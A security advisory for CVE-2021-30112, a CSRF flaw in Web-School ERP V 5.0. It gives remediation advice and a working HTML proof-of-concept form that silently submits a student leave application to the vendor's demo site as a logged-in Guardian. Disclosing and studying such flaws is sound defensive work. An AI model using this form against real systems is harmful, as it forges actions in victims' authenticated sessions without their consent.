| **Product** : Web-School ERP V 5.0  **Description**: Web-School ERP V 5.0 contains a cross-site request forgery (CSRF) vulnerability that allows a remote attacker to create a student\_leave\_application request through module/core/studentleaveapplication/create. The application fails to validate the CSRF token for a POST request using Guardian privilege.  **Recommendations :**  1- Implement `X-CSRF-TOKEN` and make sure it's validating in back-end server as well 2- Implement an interceptor which appends token value to every (state-changing) request in custom request header `X-XSRF-TOKEN-B`  **Video POC** : [Google Drive](https://drive.google.com/file/d/1NvU9FJl1wO7bz9bWe-fAk5pX8PGCNRS5/view?usp=sharing)  **POC** :  ``` <!DOCTYPE html> <html> <head> <meta name="viewport" content="width=device-width, initial-scale=1"> <style> body, html {   height: 100%;   margin: 0; }  .bg {   /* The image used */   background-image: url("https://avatars.githubusercontent.com/u/78818477?s=400&u=b18f9de63b3df28e6e1b4d2dc64303048aa5f5b5&v=4");    /* Full height */   height: 100%;     /* Center and scale the image nicely */   background-position: center;   background-repeat: no-repeat;   background-size: cover; } </style> </head> <body>  <div class="bg"></div>  <p>CSRF CVE-2021-30112 , After clicking below button a Studentleaveapplication request will be created   !!.</p>  </body>    <form enctype="multipart/form-data" method="POST" action="http://demowebsch.web-school.in/index.php/core/studentleaveapplication/create">  <input class="form-control hasDatepicker" placeholder="start date" id="Studentleaveapplication_fromdate" name="Studentleaveapplication[fromdate]" type="text" value="04/20/2021">  <input class="form-control hasDatepicker" placeholder="start date" id="Studentleaveapplication_todate" name="Studentleaveapplication[todate]" type="text" value="04/22/2021">  <input class="form-control" name="Studentleaveapplication[reason]" id="Studentleaveapplication_reason" value="CSRF everywhere">  <input class="btn btn-info" type="submit" name="yt0" value="Create">  ``` |
